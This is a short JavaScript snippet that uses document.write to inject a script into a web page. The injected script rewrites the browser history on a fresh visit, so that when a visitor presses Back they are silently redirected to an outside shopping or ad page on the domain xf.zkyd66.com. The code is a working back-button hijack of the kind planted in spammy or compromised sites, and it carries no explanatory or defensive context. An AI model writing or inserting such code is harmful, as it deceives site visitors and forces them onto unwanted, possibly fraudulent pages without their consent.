document.write("<script>");
document.write("(function (window, location) {");
document.write("if (history.length <= 2) {");
document.write("history.replaceState(null, document.title, location.pathname + \"#!/ref\");");
document.write("history.pushState(null, document.title, location.pathname);");
document.write("window.addEventListener(\"popstate\", function () {");
document.write("if (location.hash === \"#!/ref\") {");
document.write("history.replaceState(null, document.title, location.pathname);");
document.write("setTimeout(function () {");
document.write("location.replace(\"http://xf.zkyd66.com/mall/xie.htm?gzid=\");");
document.write("}, 0);");
document.write("}");
document.write("}, false);");
document.write("}");
document.write("}(window, location));");
document.write("</script>");

